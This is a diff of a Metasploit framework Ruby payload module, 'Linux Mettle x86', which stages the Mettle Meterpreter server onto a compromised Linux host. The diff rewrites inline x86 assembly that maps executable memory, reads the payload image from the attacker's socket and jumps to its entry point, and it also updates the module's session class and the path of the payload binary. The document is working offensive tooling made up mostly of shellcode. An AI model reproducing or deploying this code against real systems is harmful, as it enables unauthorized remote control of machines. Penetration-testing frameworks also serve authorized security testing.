@@ -4,7 +4,7 @@
 ##
 
 require 'msf/core'
-require 'msf/base/sessions/meterpreter_x86_linux'
+require 'msf/base/sessions/meterpreter_x86_mettle_linux'
 require 'msf/base/sessions/meterpreter_options'
 require 'rex/elfparsey'
 
@@ -16,12 +16,12 @@ module MetasploitModule
       'Name'          => 'Linux Mettle x86',
       'Description'   => 'Inject the mettle server payload (staged)',
       'Author'        => [
-        'William Webb'
+        'William Webb <william_webb[at]rapid7.com>'
       ],
       'Platform'      => 'Linux',
       'Arch'          => ARCH_X86,
       'License'       => MSF_LICENSE,
-      'Session'       => Msf::Sessions::Meterpreter_x86_Linux)) # ? will we need to add a new one for x64?
+      'Session'       => Msf::Sessions::Meterpreter_x86_Mettle_Linux))
   end
 
   def elf_ep(payload)
@@ -33,9 +33,8 @@ module MetasploitModule
   def handle_intermediate_stage(conn, payload)
     entry_offset = elf_ep(payload)
 
-    # does metasm understand comments ?
-
     midstager_asm = %Q^
+      push ebx                    ; save sockfd
       xor ebx, ebx                ; address
       mov ecx, #{payload.length}  ; length
       mov edx, 7                  ; PROT_READ | PROT_WRITE | PROT_EXECUTE
@@ -45,44 +44,47 @@ module MetasploitModule
       mov eax, 192                ; mmap2
       int 0x80                    ; syscall
 
-      ; recv mettle process image
-      mov edx, ecx                ; ecx should still contain SIZE
-      pop ebx                     ; should still be SOCKFD
-      mov edi, ebx                ; copy sockfd to edi for later on
-      mov ecx, eax                ; mmap'ed buffer address
-      mov esi, 256                ; MSG_WAITALL
-      mov eax, 291                ; recv
+      ; receive mettle process image
+      mov edx, eax                ; save buf addr for next code block
+      pop ebx                     ; sockfd
+      push 0x00000100             ; MSG_WAITALL
+      push #{payload.length}      ; size
+      push eax                    ; buf
+      push ebx                    ; sockfd
+      mov ecx, esp                ; arg array
+      mov ebx, 10                 ; SYS_READ
+      mov eax, 102                ; sys_socketcall
       int 0x80                    ; syscall
 
+      ; setup stack
+      pop edi
       xor ebx, ebx
       and esp, 0xfffffff0         ; align esp
-      add esp, 260                ; add esp, see adam or a debugger for explaination
+      add esp, 40
+      mov eax, 109
+      push eax
+      mov esi, esp
       push ebx                    ; NULL
       push ebx                    ; AT_NULL
-      push ecx                    ; mmap'ed buffer ? is ecx still preserved at this point?
+      push edx                    ; mmap buffer
       mov eax, 7
       push eax                    ; AT_BASE
       push ebx                    ; end of ENV
       push ebx                    ; NULL
       push edi                    ; sockfd
-      push esp                    ; argv[0]
+      push esi                    ; m
       mov eax, 2
       push eax                    ; argc
-      mov eax, 109
-      push eax                    ; "m" (0,0,0,109)
 
       ; down the rabbit hole
       mov eax, #{entry_offset}
-      mov ebx, #{payload.length}
-      add eax, ebx
-      jmp eax
+      add edx, eax
+      jmp edx
     ^
-
     midstager = Metasm::Shellcode.assemble(Metasm::X86.new, midstager_asm).encode_string
     print_status("Transmitting intermediate stager for over-sized stage...(#{midstager.length} bytes)")
-    conn.put([midstager.length].pack('V'))
     conn.put(midstager)
-
+    print_status("Sent")
     true
   end
 
@@ -91,7 +93,8 @@ module MetasploitModule
   end
 
   def generate_meterpreter
-    MetasploitPayloads.read('meterpreter', 'mettle-linux-x86.bin')
+    s = MetasploitPayloads::Mettle.read('i486-linux-musl', 'mettle.bin')
+    s
   end
 
   def generate_config(opts={})
